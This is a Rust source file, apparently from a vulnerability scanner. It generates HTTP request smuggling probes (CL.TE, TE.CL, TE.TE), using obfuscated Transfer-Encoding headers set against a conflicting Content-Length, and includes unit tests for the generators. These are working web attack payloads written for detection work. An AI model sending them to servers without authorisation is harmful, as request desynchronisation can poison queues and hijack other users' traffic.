pub fn get_cl_te_payloads(path: &str, host: &str, method: &str, custom_headers: &[String]) -> Vec<String> {
    let te_headers = vec![
        "Transfer-Encoding: chunked",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding\t: chunked",
        "Transfer-Encoding\r\n : chunked",
    ];
    let mut payloads = Vec::new();
    let custom_header_str = if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    };
    
    for te_header in te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\n\
             Content-Length: 6\r\n\
             {}\r\n\
             \r\n\
             0\r\n\
             \r\n\
             G",
            method, path, host, custom_header_str, te_header
        ));
    }
    payloads
}

pub fn get_te_cl_payloads(path: &str, host: &str, method: &str, custom_headers: &[String]) -> Vec<String> {
    let te_headers = vec![
        "Transfer-Encoding: chunked",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding\t: chunked",
        "Transfer-Encoding\r\n : chunked",
    ];
    let mut payloads = Vec::new();
    let custom_header_str = if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    };
    
    for te_header in te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\n\
             Content-Length: 4\r\n\
             {}\r\n\
             \r\n\
             1\r\n\
             A\r\n\
             0\r\n\
             \r\n",
            method, path, host, custom_header_str, te_header
        ));
    }
    payloads
}

pub fn get_te_te_payloads(path: &str, host: &str, method: &str, custom_headers: &[String]) -> Vec<String> {
    let custom_header_str = if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    };
    
    let te_variations = vec![
        ("Transfer-Encoding: chunked", "Transfer-Encoding: x-custom"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: identity"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: gzip, chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked, identity"),
    ];
    
    let mut payloads = Vec::new();
    for (te1, te2) in te_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
            Host: {}\r\n\
            {}\n\
            Content-Length: 4\r\n\
            {}\r\n\
            {}\r\n\
            \r\n\
            1\r\n\
            A\r\n\
            0\r\n\
            \r\n",
            method, path, host, custom_header_str, te1, te2
        ));
    }
    payloads
}


#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::CheckResult;

    #[test]
    fn test_cl_te_payloads_generation() {
        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &[]);
        assert!(!payloads.is_empty());
        assert_eq!(payloads.len(), 6);
        
        // Check that all payloads contain required components
        for payload in &payloads {
            assert!(payload.contains("Content-Length: 6"));
            assert!(payload.contains("Transfer-Encoding"));
            assert!(payload.contains("POST /test HTTP/1.1"));
            assert!(payload.contains("Host: example.com"));
        }
    }

    #[test]
    fn test_te_cl_payloads_generation() {
        let payloads = get_te_cl_payloads("/api", "target.com", "GET", &[]);
        assert!(!payloads.is_empty());
        assert_eq!(payloads.len(), 6);
        
        for payload in &payloads {
            assert!(payload.contains("Content-Length: 4"));
            assert!(payload.contains("Transfer-Encoding"));
            assert!(payload.contains("GET /api HTTP/1.1"));
        }
    }

    #[test]
    fn test_te_te_payloads_generation() {
        let payloads = get_te_te_payloads("/", "site.com", "POST", &[]);
        assert!(!payloads.is_empty());
        assert_eq!(payloads.len(), 4);
        
        for payload in &payloads {
            assert!(payload.contains("Transfer-Encoding"));
            assert!(payload.contains("POST / HTTP/1.1"));
        }
    }

    #[test]
    fn test_custom_headers_integration() {
        let custom_headers = vec![
            "X-Custom-Header: value1".to_string(),
            "Authorization: Bearer token".to_string(),
        ];
        
        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &custom_headers);
        
        for payload in &payloads {
            assert!(payload.contains("X-Custom-Header: value1"));
            assert!(payload.contains("Authorization: Bearer token"));
        }
    }

    #[test]
    fn test_check_result_serialization() {
        let result = CheckResult {
            check_type: "CL.TE".to_string(),
            vulnerable: false,
            payload_index: None,
            normal_status: "HTTP/1.1 200 OK".to_string(),
            attack_status: None,
            normal_duration_ms: 150,
            attack_duration_ms: None,
            timestamp: "2024-01-01T12:00:00Z".to_string(),
        };
        
        let json = serde_json::to_string(&result);
        assert!(json.is_ok());
        
        let deserialized: Result<CheckResult, _> = serde_json::from_str(&json.unwrap());
        assert!(deserialized.is_ok());
    }
}
